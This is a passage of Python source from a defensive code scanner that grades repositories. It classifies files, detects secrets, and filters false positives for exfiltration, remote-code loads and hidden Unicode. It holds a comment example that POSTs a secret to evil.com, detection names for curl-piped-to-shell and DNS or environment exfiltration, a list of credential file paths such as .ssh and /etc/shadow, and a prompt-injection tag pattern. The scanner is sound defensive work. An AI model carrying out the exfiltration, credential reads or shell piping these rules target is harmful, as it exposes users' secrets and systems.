    return Path(file_path).suffix.lower() in _SCRIPT_CONFIG_EXTS


def _is_infra_script(file_path: str) -> bool:
    """True for a CI/release-infrastructure script or config file (see above)."""
    if not _is_script_or_config(file_path):
        return False
    parts = [p.lower() for p in Path(file_path).parts[:-1]]
    if any(p in _CI_CONFIG_DIRS or p in _INFRA_DIRS or p.endswith(("-runner", "_runner"))
           for p in parts):
        return True
    # scripts/release.sh, scripts/release-mac.sh, scripts/release/notarize.sh
    for i, p in enumerate(parts):
        if p in ("scripts", "script"):
            below = parts[i + 1:] + [Path(file_path).name.lower()]
            if any(b.startswith("release") for b in below):
                return True
    return False


# A standalone installer a user runs ONCE to install the product (`curl …/install.sh |
# sh`): download_cli.sh, install.sh, get-foo.sh, install-foo.ps1 at the repo root or in
# scripts/. It is how the tool is delivered, not code the tool runs.
_INSTALLER_STEM_RE = re.compile(
    r"^(?:install(?:er)?|download[-_]?cli|get[-_][\w.-]+|install[-_][\w.-]+)$")


def _is_installer_script(file_path: str) -> bool:
    p = Path(file_path)
    if p.suffix.lower() not in (".sh", ".bash", ".zsh", ".ps1"):
        return False
    parts = [x.lower() for x in p.parts[:-1]]
    if parts not in ([], ["scripts"], ["script"]):
        return False
    return bool(_INSTALLER_STEM_RE.match(p.stem.lower()))


def _is_unshipped_script(file_path: str) -> bool:
    """Infra/CI/release scripts and one-time installer scripts: never the runtime surface,
    so their findings are downgraded, weighted like tests, and never block."""
    return _is_infra_script(file_path) or _is_installer_script(file_path)


def _is_infra_file(file_path: str) -> bool:
    """Check if a file is CI/infra config (graded like tests/docs, not shipped code).

    Dockerfiles, `.github/**` / `.gitlab/**` workflow YAMLs, and agent skill configs
    (`.agents/**`) legitimately contain `RUN curl | sh`, pipe-to-shell, etc. Their
    findings are DOWNGRADED (same as tests/docs) so a single CI recipe can't produce
    the critical that zeroes an otherwise-clean repo's grade.
    """
    parts = Path(file_path).parts
    if any(p in (".github", ".gitlab", ".agents", ".circleci", ".buildkite") for p in parts):
        return True
    name = Path(file_path).name
    lname = name.lower()
    if name == "Dockerfile" or name.startswith("Dockerfile.") or lname.endswith(".dockerfile"):
        return True
    # Common root-level CI config files
    if lname in (".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "cloudbuild.yaml"):
        return True
    # Build / developer tooling that never runs for a consumer (`pip install` does not
    # run the Makefile, tox, nox, or pre-commit): graded like CI config.
    if _is_build_tooling_file(file_path):
        return True
    if _is_unshipped_script(file_path):
        return True
    # Workflow YAMLs (e.g. under a workflows/ directory)
    if any(p == "workflows" for p in parts) and lname.endswith((".yml", ".yaml")):
        return True
    return False


# --- Per-file language dispatch (#2) -----------------------------------------
# Language-SPECIFIC pattern groups must only run on files of that language, so Python
# `exec()` no longer fires on `.mjs` and Ruby `system`/backtick no longer fires on TS
# template literals. Language-AGNOSTIC groups (secrets, exfiltration, invisible unicode,
# prompt injection) keep running on every file.
_EXT_TO_LANG: dict[str, str] = {
    ".py": "python", ".ipynb": "python",
    ".js": "javascript", ".mjs": "javascript", ".cjs": "javascript", ".jsx": "javascript",
    ".ts": "typescript", ".tsx": "typescript",
    ".rb": "ruby",
    ".go": "go",
    ".rs": "rust",
    ".java": "java",
}

# A pattern's NAME carries its language tag (e.g. "(Python)", "(Node.js)"); map those
# tags to the file-languages they apply to. Node runs both JS and TS.
_PATTERN_LANG_TAGS: list[tuple[str, frozenset]] = [
    ("python", frozenset({"python"})),
    ("node", frozenset({"javascript", "typescript"})),
    ("(js)", frozenset({"javascript", "typescript"})),
    ("ruby", frozenset({"ruby"})),
    ("(go)", frozenset({"go"})),
    ("rust", frozenset({"rust"})),
    ("java", frozenset({"java"})),
]


def _required_langs(pattern_name: str) -> frozenset:
    """Languages a pattern targets, inferred from its name. Empty = language-agnostic."""
    lname = pattern_name.lower()
    langs: set = set()
    for tag, mapped in _PATTERN_LANG_TAGS:
        if tag in lname:
            langs |= mapped
    return frozenset(langs)


def _lang_ok(pattern_name: str, file_lang: str | None) -> bool:
    """True if a (possibly language-specific) pattern should run on this file.

    Patterns whose name has no language tag are agnostic → always run. A tagged
    pattern runs only when the file's detected language is one it targets.
    """
    required = _required_langs(pattern_name)
    if not required:
        return True
    if file_lang is None:
        return False
    return file_lang in required


def _line_has_blocking_match(line: str, file_lang: str | None) -> bool:
    """True if a line matches a critical/high pattern in the RCE/secret/exfil sets —
    used so an inline `ag-scan:ignore` can't silently hide a real critical. Cheap:
    only runs on the (rare) suppressed lines, and only over the high-severity sets."""
    for pset in (
        SECRET_PATTERNS, UNSAFE_EXEC_PATTERNS, INSECURE_DESERIALIZATION_PATTERNS,
        DYNAMIC_REMOTE_LOAD_PATTERNS, EXFILTRATION_PATTERNS, OBFUSCATION_PATTERNS,
    ):
        for name, pattern, severity in pset:
            if severity in ("critical", "high") and _lang_ok(name, file_lang) \
                    and pattern.search(line):
                return True
    return False


def _is_safe_exec_context(
    line: str, finding_name: str, file_path: str = "",
) -> bool:
    """Check if an eval/exec match is actually a safe usage pattern (DB ``.execute``,
    ``ast.literal_eval``, a ``def exec(`` definition, version reads). The subprocess /
    os.system argv rules moved to ``src/scanner/exec_classify.py``."""
    stripped = line.strip()
    filename = Path(file_path).name.lower() if file_path else ""

    # eval/exec — skip if it's ast.literal_eval or similar safe wrappers
    if "eval" in finding_name.lower() or "exec" in finding_name.lower():
        if _SAFE_EVAL_RE.search(stripped):
            return True
        # db.execute(), session.execute(), conn.execute() — SQLAlchemy / DB calls
        if _SAFE_DB_EXEC_RE.search(stripped):
            return True
        # cursor.execute() — standard DB-API
        if "cursor" in stripped.lower() and "execute" in stripped.lower():
            return True
        # await exec(session, ...) — common DB helper wrapper pattern
        if re.search(r"""(?:await\s+)?exec\s*\(\s*(?:session|conn|db|cursor)""", stripped):
            return True
        # def exec(...) or async def exec(...) — function definition, not builtin exec
        if re.search(r"""(?:async\s+)?def\s+exec\s*\(""", stripped):
            return True

    # eval() in __init__.py — commonly used for version parsing, e.g. eval(f.read())
    if "eval" in finding_name.lower() and filename == "__init__.py":
        # Only safe if it looks like version extraction
        if re.search(r"""(?:version|__version__|VERSION)""", stripped, re.IGNORECASE):
            return True

    # exec() in migration files or setup.py — expected usage
    if "exec" in finding_name.lower():
        parts = Path(file_path).parts if file_path else ()
        is_migration = any(
            p in ("migrations", "alembic", "versions", "migrate")
            for p in parts
        )
        is_setup = filename in ("setup.py", "setup.cfg", "conftest.py")
        if is_migration or is_setup:
            return True

    return False


def _is_safe_fs_context(
    line: str, _finding_name: str, file_path: str = "",
) -> bool:
    """Check if a file system access match is actually a safe usage pattern."""
    stripped = line.strip()

    for safe_pat in _SAFE_OPEN_PATTERNS:
        if safe_pat.search(stripped):
            return True

    # open(os.devnull, "w") — a sink, not a file write
    if re.search(r"open\s*\(\s*os\.devnull\b", stripped):
        return True
    # A path rooted in the package's OWN install dir (its package.json, a bundled
    # asset): `path.join(__dirname, …)`, `fileURLToPath(import.meta.url)`, `__file__`.
    if re.search(r"__dirname|import\.meta\.url|__file__|importlib\.resources", stripped):
        return True

    # Path.write_text / read_text (already method-chained on Path object)
    if re.search(r"\.(?:read_text|write_text|read_bytes|write_bytes)\s*\(", stripped):
        return True

    # Reading config files by extension — almost always legitimate
    if _CONFIG_FILE_READ_RE.search(stripped):
        return True

    # Writing to known safe directories (logs/, tmp/, .cache/, etc.)
    if _SAFE_WRITE_DIR_RE.search(stripped):
        return True

    # open() with a string literal filename containing a config extension
    # e.g. open("settings.toml"), open("config.yml")
    m = re.search(r"""open\s*\(\s*['"]([^'"]+)['"]""", stripped)
    if m:
        target_path = m.group(1)
        target_ext = Path(target_path).suffix.lower()
        if target_ext in _CONFIG_FILE_EXTENSIONS:
            return True
        # Writing to a safe directory based on path components
        target_parts = Path(target_path).parts
        if any(p.lower() in _SAFE_WRITE_DIRS for p in target_parts):
            return True

    return False


def _downgrade_fs_severity(
    line: str, severity: str,
) -> str:
    """Downgrade fs_access severity for safer patterns like pathlib usage."""
    stripped = line.strip()
    # pathlib.Path usage is generally safer than raw open() — sandboxed by design
    if "Path(" in stripped or "pathlib" in stripped:
        if severity == "high":
            return "medium"
        if severity == "medium":
            return "low"
    return severity


# Obvious non-secret placeholders. The matched secret value is separator/case-
# normalized (CHANGE-ME-IN-PRODUCTION -> changemeinproduction) then substring-
# checked against these, so hyphen/underscore/case variants all collapse. Kept
# high-precision — these tokens effectively never appear inside a real credential.
_SECRET_PLACEHOLDER_CORES = (
    "changeme", "replaceme", "placeholder", "example", "yourapikey", "yourapitoken",
    "yoursecret", "yourtoken", "yourkey", "yourpassword", "dummy", "redacted",
    "notasecret", "insertkey", "insertyour", "todo", "fixme", "xxxx", "foobar",
)


# Fake-key words. In a TEST config / fixture file (``_is_test_fixture_file``) a secret
# whose VALUE carries one of these is a fixture (dify's pytest.ini ``env =`` line:
# ``sk-ant-api11-IamNotARealKeyJustForMockTestKawaii…``), not a credential. Matched on
# the separator/case-normalized value like ``_SECRET_PLACEHOLDER_CORES``. Scoped to test
# files only: ``test`` / ``mock`` / ``fake`` inside a value elsewhere is not evidence,
# and a real-looking key in a test file (no marker) still fires.
_FAKE_SECRET_MARKERS = (
    "fake", "mock", "dummy", "test", "example", "notareal", "notreal", "xxxx",
    "placeholder", "sample", "invalid",
)
_TEST_CONFIG_NAMES = frozenset({
    "pytest.ini", "tox.ini", "setup.cfg", "conftest.py", "noxfile.py",
    ".env.test", ".env.testing", ".env.ci", "phpunit.xml", "phpunit.xml.dist",
})
_TEST_CONFIG_PREFIXES = (
    "jest.config.", "jest.setup.", "vitest.config.", "vitest.setup.", "karma.conf.",
    "playwright.config.", "cypress.config.",
)
_TEST_FIXTURE_DIRS = frozenset({
    "tests", "test", "__tests__", "spec", "testing", "e2e",
    "fixtures", "fixture", "__fixtures__", "__mocks__", "mocks", "testdata", "test_data",
})


def _is_test_fixture_file(file_path: str) -> bool:
    """A test runner's config (pytest.ini, tox.ini, setup.cfg, conftest.py, jest /
    vitest config, .env.test), a file under a test / fixture dir, or a test-named file:
    where a made-up key is a fixture."""
    p = Path(file_path)
    name = p.name.lower()
    if name in _TEST_CONFIG_NAMES or name.startswith(_TEST_CONFIG_PREFIXES):
        return True
    if any(x.lower() in _TEST_FIXTURE_DIRS for x in p.parts[:-1]):
        return True
    stem = p.stem.lower()
    return (".test." in name or ".spec." in name or stem.startswith("test_")
            or stem.endswith(("_test", "_spec")))


def _is_fake_fixture_secret(val_norm: str, file_path: str) -> bool:
    """A secret VALUE marked fake (``_FAKE_SECRET_MARKERS``) in a test fixture file."""
    return (any(tok in val_norm for tok in _FAKE_SECRET_MARKERS)
            and _is_test_fixture_file(file_path))


def _is_counting_placeholder(val: str) -> bool:
    """A key body made only of counting runs (``1234567890abcdef1234567890…``, ghapi's
    spec example) is a made-up value, never random key material. Every maximal run of
    consecutive characters (9 wraps to 0) must be 4+ long, over 16+ characters, so a
    random key that merely contains ``1234`` is still a key."""
    body = re.split(r"[_-]", val)[-1]
    if len(body) < 16:
        return False
    run = 1
    for prev, ch in zip(body, body[1:]):
        if ord(ch) == ord(prev) + 1 or (prev == "9" and ch == "0"):
            run += 1
            continue
        if run < 4:
            return False
        run = 1
    return run >= 4

# OAuth2 token exchange looks exactly like exfiltration (a client_secret POSTed
# outbound), but it's the REQUIRED auth flow. These hints — grant types, token/
# authorize endpoints, well-known auth hosts — mark a POST as a legitimate OAuth
# exchange so it isn't graded as a data leak. High-precision: none appear in a
# plain `requests.post("http://evil.com", data={"secret": key})` exfil.
_OAUTH_ENDPOINT_HINTS = (
    "grant_type", "token_url", "token_endpoint", "tokenurl", "tokenendpoint",
    "/oauth", "oauth2", "openid", "/token", "/authorize", "authorization_code",
    "client_credentials", "refresh_token", "accounts.google.com/o/oauth2",
    "login.microsoftonline.com", "github.com/login/oauth", ".well-known/openid",
)


def _looks_like_oauth(lines: list[str], line_num: int) -> bool:
    """True if the outbound POST at ``line_num`` (1-indexed) is a legitimate OAuth2
    token exchange — a client_secret / grant_type sent to a token/authorize endpoint
    — rather than exfiltration. Checks a small window since the URL is often on a
    nearby line from the POST call."""
    lo = max(0, line_num - 4)
    hi = min(len(lines), line_num + 3)
    window = "\n".join(lines[lo:hi]).lower()
    return any(h in window for h in _OAUTH_ENDPOINT_HINTS)


# Emoji tag sequence (UTS #51): WAVING BLACK FLAG + tag digits / lowercase tag letters +
# CANCEL TAG — the England / Scotland / Wales flags. Data, not smuggled ASCII.
_EMOJI_TAG_SEQ_RE = re.compile(
    "\U0001F3F4[\U000E0030-\U000E0039\U000E0061-\U000E007A]{1,32}\U000E007F"
)


def _benign_zero_width(line: str, pos: int) -> bool:
    """ZWJ / ZWNJ doing its typographic job: joining an emoji sequence (man ZWJ woman ZWJ girl),
    following a combining mark in an Indic script (virama + ZWJ), or ZWNJ between two
    non-Latin letters (Persian). ZWSP / WORD JOINER / MVS, and any joiner between Latin
    letters (the steganography / token-splitting shape), are never benign."""
    import unicodedata

    ch = line[pos]
    if ch not in "\u200c\u200d" or pos == 0 or pos + 1 >= len(line):
        return False
    prev, nxt = line[pos - 1], line[pos + 1]
    pc, nc = unicodedata.category(prev), unicodedata.category(nxt)
    # A joiner that ENDS a string literal (a grapheme-table key like `'<virama>\u200d'`)
    # is judged by what it follows.
    closes = nxt in "'\""

    def emojiish(c: str, cat: str) -> bool:
        # Emoji blocks count even when this Python's Unicode DB predates them (Cn).
        return (cat == "So" or c == "\ufe0f" or 0x1F000 <= ord(c) <= 0x1FAFF
                or (cat == "Sm" and ord(c) >= 0x2000))  # face ZWJ left-right arrow (head shaking)
    if ch == "\u200d" and emojiish(prev, pc) and (closes or emojiish(nxt, nc)):
        return True
    if pc in ("Mn", "Mc") and ord(prev) >= 0x0900 and (closes or nc[0] in "LM"):
        return True
    return ch == "\u200c" and pc == "Lo" and (closes or nc == "Lo")


_MINIFIED_LINE_CHARS = 1000
_INJECTION_TAG_ONLY_RE = re.compile(
    r"<\s*/?\s*(?:system|important|instructions?|SYSTEM|IMPORTANT|INSTRUCTIONS?)\s*>")


def _bidi_cannot_reorder_code(line: str, in_prose: bool, file_lang: str | None) -> bool:
    """A bidi control on a line that carries no code a reviewer reads: an interior line
    of a multi-line string / comment (no quote or comment delimiter on it), or a
    minified bundle line."""
    if len(line) > _MINIFIED_LINE_CHARS and file_lang in ("javascript", "typescript"):
        return True
    if not in_prose:
        return False
    return not any(d in line for d in ('"""', "'''", "`", "*/", "/*"))


_EXAMPLE_INTRO_RE = re.compile(r"\b(?:example|e\.g\.|for instance)\b[^\"'`]{0,12}$",
                               re.IGNORECASE)


_SYSTEM_PROMPT_LABEL_RE = re.compile(r"system\s+prompt\s*:", re.IGNORECASE)
# After the label: only escapes / whitespace, then a placeholder, then the string or the
# template line ends (the label's whole value is the placeholder).
_PLACEHOLDER_TAIL_RE = re.compile(
    r"""^(?:\s|\\[nt])*(?:%[-#0 +]*\d*(?:\.\d+)?[sdrfi]|\{[^{}\n]{0,40}\}|\$\{[^{}\n]{0,40}\})"""
    r"""[ \t]*(?:\\n|["'`])""")


def _system_prompt_label_only(line: str, pattern: re.Pattern) -> bool:
    """Every hit of the role-directive rule on this line is a "system prompt:" label
    followed only by a format placeholder before the string closes."""
    hits = list(pattern.finditer(line))
    if not hits:
        return False
    for m in hits:
        lm = _SYSTEM_PROMPT_LABEL_RE.search(m.group(0))
        if lm is None:
            return False
        if not _PLACEHOLDER_TAIL_RE.match(line[m.end():]):
            return False
    return True


# A value with a live provider prefix is a real credential even inside an "Example".
_LIVE_KEY_PREFIX_RE = re.compile(
    r"(?:sk[-_]|sk-ant-|sk_live_|rk_live_|pk_live_|ghp_|gho_|ghu_|ghs_|ghr_|github_pat_|"
    r"AKIA|ASIA|xox[abposr]-|AIza|glpat-|hf_|npm_|pypi-|SG\.|key-|shpat_|sq0)",
)


def _is_documented_example(line: str, pos: int) -> bool:
    """The assignment at ``pos`` is prose inside a string literal, introduced right
    before by "Example" / "e.g." (``"…Example api_key='…'"``)."""
    before = line[:pos]
    if not _EXAMPLE_INTRO_RE.search(before):
        return False
    # Inside a string: an odd number of unescaped double quotes before it.
    return before.count('"') % 2 == 1 or before.count("'") % 2 == 1


_PY_POST_CALL_RE = re.compile(r"(?:requests|httpx|axios)\.post\s*\(", re.IGNORECASE)
_PY_FETCH_SECRET_RE = re.compile(
    r"""https?://|os\.environ|getenv|password|passwd|token|secret""", re.IGNORECASE)


# fetch()'s `credentials` option ('same-origin' | 'include' | 'omit') says whether the
# browser sends cookies; it is not a credential being sent. Next.js inlines
# `fetch(location.pathname+'?…',{credentials:'same-origin',headers:{…}})`.
_FETCH_CREDENTIALS_OPTION_RE = re.compile(
    r"""\bcredentials\s*:\s*(?:'|"|`|\\['"])(?:same-origin|include|omit)(?:'|"|`|\\['"])""",
    re.IGNORECASE)


def _only_fetch_credentials_option(line: str, pattern: re.Pattern[str]) -> bool:
    """The exfil match rests only on fetch's `credentials` mode option: with every such
    option removed the rule no longer matches. A real key/secret/token/password in the
    same call still matches and is kept."""
    if not _FETCH_CREDENTIALS_OPTION_RE.search(line):
        return False
    return not pattern.search(_FETCH_CREDENTIALS_OPTION_RE.sub("mode:''", line))


# Keys whose value lists hosts / origins a server ACCEPTS (inbound), never a place data
# is sent: Vite / webpack-dev-server allowedHosts, Django ALLOWED_HOSTS /
# CSRF_TRUSTED_ORIGINS / CORS_*, Starlette TrustedHostMiddleware, cors({origin}).
_HOST_ALLOWLIST_KEYS = frozenset({
    "allowedhosts", "allowed_hosts", "trustedhosts", "trusted_hosts", "trustedorigins",
    "trusted_origins", "csrf_trusted_origins", "cors_allowed_origins",
    "cors_origin_whitelist", "cors_origins", "cors_allow_origins", "allowedorigins",
    "allowed_origins", "allow_origins", "alloworigins", "origin", "origins",
    "csrftrustedorigins", "allowedhostnames", "allowed_hostnames",
})
_ALLOWLIST_STR = r"""(?:"[^"\n]*"|'[^'\n]*'|`[^`\n$]*`)"""
# `<key> [:=] [ [ ( { new Set([ ] "a", "b", "<host…` up to the matched host.
_ALLOWLIST_PREFIX_RE = re.compile(
    r"""(?P<key>[A-Za-z_][\w.]*|"[^"\n]+"|'[^'\n]+')\s*(?::\s*(?:list|set|tuple|"""
    r"""string\[\]|str|List\[str\]|Set\[str\]|Array<string>)?\s*)?[:=]\s*"""
    r"""(?:new\s+Set\s*\(\s*\[|[\[({])?\s*"""
    r"""(?:""" + _ALLOWLIST_STR + r"""\s*,\s*)*["'`](?:https?://|wss?://)?[\w.\-*]*$""")
_ALLOWLIST_ELEMS_ONLY_RE = re.compile(
    r"""^\s*(?:""" + _ALLOWLIST_STR + r"""\s*,\s*)*["'`](?:https?://|wss?://)?[\w.\-*]*$""")
_ALLOWLIST_CONT_LINE_RE = re.compile(
    r"""^\s*(?:(?:""" + _ALLOWLIST_STR + r"""\s*,?\s*)*|//.*|#.*)$""")
_ALLOWLIST_OPEN_LINE_RE = re.compile(
    r"""(?P<key>[A-Za-z_][\w.]*|"[^"\n]+"|'[^'\n]+')\s*(?::\s*[\w\[\]<>, ]+)?\s*[:=]\s*"""
    r"""(?:new\s+Set\s*\(\s*)?[\[(]\s*(?:""" + _ALLOWLIST_STR + r"""\s*,?\s*)*$""")
# The host ends a plain literal element: `"x.ngrok.io"` then `,` / `]` / `)` / `}`.
_ALLOWLIST_SUFFIX_RE = re.compile(r"""^[\w.\-:/]*["'`]\s*(?:[,\])}]|$)""")
# A network call anywhere in the file (call-shaped; `os.environ.get(` is not one).
_NET_SINK_CALL_RE = re.compile(
    r"(?<![\w$])(?:fetch|axios|got|ky|request|superagent|needle|urlopen|"
    r"XMLHttpRequest|sendBeacon|WebSocket|EventSource|createClient|Client|Session|"
    r"(?:requests|httpx|aiohttp|urllib\w*|http|https|net|tls|dgram|axios|got|ky|"
    r"undici|socket)\.\w+|"
    r"[\w$\]\)]+\.(?:post|put|patch|send|request|fetch|connect|emit|write|open))\s*\(")
# Keys that are a host allowlist only in a CORS context (`cors({ origin: [...] })`,
# Django `CORS_*`); elsewhere `origin` can name a client's base URL.
_CORS_ONLY_KEYS = frozenset({"origin", "origins"})


def _allowlist_key_ok(key: str, lines: list[str], idx: int) -> bool:
    k = key.strip("\"'").rsplit(".", 1)[-1].lower()
    if k in _CORS_ONLY_KEYS:
        # `cors({ origin: [...] })` / `@fastify/cors` options: the call opens on this
        # line or just above (a comment that says "cors" does not count).
        return any(re.search(r"\bcors\w*\s*\(|\bregister\s*\(\s*\w*cors", ln, re.I)
                   and not _is_line_comment(ln) for ln in lines[max(0, idx - 3): idx + 1])
    if k in _HOST_ALLOWLIST_KEYS:
        return True
    # Vite / webpack `hmr: { host: … }` is where the dev server's websocket listens.
    return k == "host" and any(
        re.search(r"\bhmr\b", ln) for ln in lines[max(0, idx - 3): idx + 1])


def _host_allowlist_entry(lines: list[str], idx: int, pattern: re.Pattern[str]) -> set[str]:
    """Every webhook/tunnel-host match on line ``idx`` is an element of a host / origin
    ALLOWLIST (`allowedHosts: ["x.ngrok.io"]`): configuration of what a server accepts,
    not a destination. Returns the allowlist key names, or an empty set when the key is
    not an allowlist key (`url`, `endpoint`, `webhook`, `target`, `baseURL`), the file
    has any network / exec / navigation sink, or the allowlist's name is read again
    (`fetch(allowedHosts[0], …)`). The caller re-checks the rest of the tree
    (npm_scripts.restore_externally_invoked)."""
    line = lines[idx]
    matches = list(pattern.finditer(line))
    if not matches:
        return set()
    keys: set[str] = set()
    for m in matches:
        if not _ALLOWLIST_SUFFIX_RE.match(line[m.end():]):
            return set()
        prefix = line[:m.start()]
        pm = _ALLOWLIST_PREFIX_RE.search(prefix)
        if pm:
            key = pm.group("key")
        elif _ALLOWLIST_ELEMS_ONLY_RE.match(prefix):
            # A multi-line list: walk up through element-only lines to the opener.
            key = None
            for j in range(idx - 1, max(-1, idx - 40), -1):
                om = _ALLOWLIST_OPEN_LINE_RE.search(lines[j])
                if om:
                    key = om.group("key")
                    break
                if not _ALLOWLIST_CONT_LINE_RE.match(lines[j]):
                    break
            if key is None:
                return set()
        else:
            return set()
        if not _allowlist_key_ok(key, lines, idx):
            return set()
        keys.add(key.strip("\"'").rsplit(".", 1)[-1])
    key_alt = "|".join(re.escape(k) for k in keys)
    named_re = re.compile(r"(?<![\w$])(?:" + key_alt + r")(?![\w$])")
    decl_re = re.compile(
        r"\s*(?:(?:export|const|let|var|readonly|static|public|private)\s+)*"
        r"(?:[\w$]+\.)*[\"']?(?:" + key_alt + r")[\"']?\s*(?::[^=\n]*?)?[:=]\s*"
        r"(?:new\s+Set\s*\(\s*\[|[\[(])")
    for n, ln in enumerate(lines):
        # Any network / exec / navigation sink anywhere in the file (comments
        # included: nothing is stripped, so nothing can hide behind a fake comment)
        # disqualifies it. An allowlist file (a Vite config, Django settings) sends
        # nothing, and a sink can reach the list without naming it
        # (`Object.values(cfg)`, `cfg["allowed" + "Hosts"]`).
        if _NET_SINK_CALL_RE.search(ln) or _OTHER_SINK_RE.search(ln):
            return set()
        if n == idx:
            # `const allowedHosts = [...]; post(allowedHosts[0], env)` on one line
            if len(named_re.findall(ln)) > 1:
                return set()
            continue
        if _is_line_comment(ln):
            continue
        dm = decl_re.match(ln)
        rest = ln[dm.end():] if dm else ln
        if named_re.search(rest):
            # The allowlist's name is read elsewhere (`fetch(allowedHosts[0])`, an
            # alias `const u = allowedHosts[0]`): it may be a destination after all.
            return set()
    return keys


# Sinks that are not a plain call: assigning a URL to an element / location, a
# dynamic import, jQuery's ajax, process exec, Python's computed globals.
_OTHER_SINK_RE = re.compile(
    r"\.(?:src|href|action|location)\s*=|\blocation\s*=|\bimport\s*\(|\$\.\w+\s*\(|"
    r"\bjQuery\b|\bexec\w*\s*\(|\bspawn\w*\s*\(|child_process|\bsubprocess\b|"
    r"\bos\.(?:system|popen)|\bsystem\s*\(|\bglobals\s*\(|\bvars\s*\(|\bgetattr\s*\(|"
    r"\beval\s*\(|\bFunction\s*\(|\bsetattr\s*\(|\bReflect\.|\bProxy\b|"
    r"\bnavigator\.|\bWorker\s*\(|\bpostMessage\b|\bsocket\b|\bdgram\b",
    re.IGNORECASE)


def _is_line_comment(line: str) -> bool:
    """A whole-line `//` comment, or a Python / shell `# ` comment (a JS private
    member `#go()` is code)."""
    t = line.lstrip()
    return t.startswith("//") or re.match(r"#(?:\s|!|$)", t) is not None


def _py_local_fetch_only(line: str, file_lang: str | None) -> bool:
    """The exfil rule's ``fetch(`` branch is the JS global ``fetch``. Python has no
    global ``fetch``: there it is a local function or parameter (litellm's
    ``await fetch(include_key)`` reads a config object from a bucket), so a Python line
    whose only hit is ``fetch(`` is not an HTTP POST. ``requests.post`` /
    ``httpx.post`` still fire, and so does a line that carries a URL literal or reads a
    secret (a local ``fetch = lambda u, d: urlopen(u, d)`` called with
    ``password=os.environ[...]``)."""
    return (file_lang == "python" and not _PY_POST_CALL_RE.search(line)
            and not _PY_FETCH_SECRET_RE.search(line))


def _benign_unicode_only(name: str, pattern: re.Pattern, line: str) -> bool:
    """True when every hit of an invisible-Unicode rule on this line is a well-formed
    emoji tag sequence or a typographic joiner (precision PR 2: wcwidth's grapheme
    tables). Smuggled tag text (no flag base / uppercase tags) still fires."""
    if name.startswith("Unicode Tags"):
        return not pattern.search(_EMOJI_TAG_SEQ_RE.sub("", line))
    if name.startswith("Zero-width"):
        return all(_benign_zero_width(line, m.start()) for m in pattern.finditer(line))
    return False


# A downgraded (test / doc / example / infra) file's critical/high defects drop to
# medium, never block, and weigh a fraction: the repo scan grades a tool on what it
# ships. Inside a PUBLISHED ARTIFACT a tests/ dir is installed next to the runtime code,
# which can import it (`from evilpkg.tests import go`), so ``payloads_full_severity``
# keeps the downgrade for capability-style findings (a test runner's subprocess, a
# fixture's eval, a conftest's env read) but exempts the payload shapes below: they keep
# their severity, carry ``Finding.payload`` and block like shipped code. (The artifact
# scan then makes the rest informational: ``artifact_scan.scan_artifact_files``.)
#
# Only in executable source: a `curl … | sh` in a .yaml / .json / .html fixture is text.
_PAYLOAD_CODE_EXTS = frozenset({
    ".py", ".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx",
    ".sh", ".bash", ".zsh", ".ps1", ".bat", ".cmd", ".vbs",
    ".rb", ".pl", ".pm", ".php", ".lua", ".go", ".rs", ".java",
})
# Remote code / script loads (the unpinned-resource and pip-install rules are not).
_PAYLOAD_REMOTE_LOAD_NAMES = frozenset({
    "Remote fetch piped into eval/exec (Python)",
    "Remote response text fed to exec/eval (Python)",
    "Remote fetch into Function/eval (JS)",
    "Remote pickle/marshal load from response",
    "curl/wget piped to shell",
})
_PAYLOAD_OBFUSCATION_NAMES = frozenset({
    "Decoded payload fed to exec/eval", "Hex-encoded string execution",
})
# `getattr(__builtins__, 'ex' + 'ec')(code)`: the builtin looked up is CALLED. A bare
# `getattr(__builtins__, '__dict__', __builtins__)` (numpy's tests) reads a namespace.
_OBFUSCATED_BUILTIN_CALL_RE = re.compile(r"""getattr\s*\(\s*__builtins__\s*,[^\n]*?\)\s*\(""")
# Whole-environment dumps and DNS tunnels are exfil whatever file they sit in; a POST
# of `key`/`token` (an auth test) is exfil only next to a credential-file read.
_PAYLOAD_EXFIL_NAMES = frozenset({"Environment variable exfil", "DNS exfiltration pattern"})
_CREDENTIAL_FILE_RE = re.compile(
    r"""\.ssh/|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.aws/credentials|/etc/shadow|\.netrc\b|"""
    r"""\.npmrc\b|\.pypirc\b|\.docker/config\.json|\.kube/config|\.git-credentials""",
)
_CREDENTIAL_WINDOW = 5
# Distinctive provider credentials. A PEM private key under tests/ is a test keypair
# (every TLS / JWT / SSH library ships them) and stays downgraded.
_PAYLOAD_SECRET_NAMES = frozenset({
    "AWS Access Key", "AWS Secret Key", "OpenAI API Key", "OpenAI Project Key",
    "Anthropic API Key", "GitHub Token", "Slack Token",
})


def _scan_content(
    content: str, file_path: str,
    allowlist: set[tuple[str, str]] | None = None,
    *, metadata_text: bool = False, payloads_full_severity: bool = False,
) -> tuple[list[Finding], list[str], int]:
    """Scan file content for security issues and positive signals.

    ``payloads_full_severity`` (artifact scans): in a downgraded file, payload-shaped
    defects keep their severity and are marked ``Finding.payload`` (see above).

    Returns (findings, positive_signals, suppressed_count).
    """
    findings: list[Finding] = []
    positives: list[str] = []
    suppressed_count = 0
    if allowlist is None:
        allowlist = set()

    file_test_or_doc = _is_test_or_doc_file(file_path)
    # CI/infra files (#3) are graded like tests/docs so a Dockerfile / workflow recipe
    # can't dominate the grade with a critical.
    is_infra = _is_infra_file(file_path)
    # Findings in tests/docs/infra are downgraded (never suppressed).
    file_downgraded = file_test_or_doc or is_infra
    is_test_or_doc, is_downgraded = file_test_or_doc, file_downgraded
    # Test / doc / example dirs only: CI recipes, build tooling and maintainer scripts
    # (infra) never run for a consumer, and an inline Rust test module only compiles
    # for `cargo test`; both keep the plain downgrade.
    payload_mode = (payloads_full_severity and file_test_or_doc
                    and Path(file_path).suffix.lower() in _PAYLOAD_CODE_EXTS)

    def _graded(kind: str, severity: str, payload: bool) -> tuple[str, bool]:
        """The downgrade for a defect on this line: ``(severity, Finding.payload)``.
        Reads ``is_downgraded`` at call time (inline Rust test lines rebind it)."""
        if kind != "defect" or not is_downgraded or severity not in ("critical", "high"):
            return severity, False
        if payload_mode and payload:
            return severity, True
        return "medium", False

    is_installer = _is_installer_script(file_path)
    # Per-file language for language-specific pattern dispatch (#2).
    file_lang = _EXT_TO_LANG.get(Path(file_path).suffix.lower())
    # Manifest / skill files ARE the tool's instruction surface — never downgrade
    # prompt-injection / hidden-unicode there even if they look doc-ish.
    is_metadata = Path(file_path).name.lower() in AGENT_METADATA_FILES
    lines = content.split("\n")
    # Which lines each regex can match on (see src/scanner/prefilter.py).
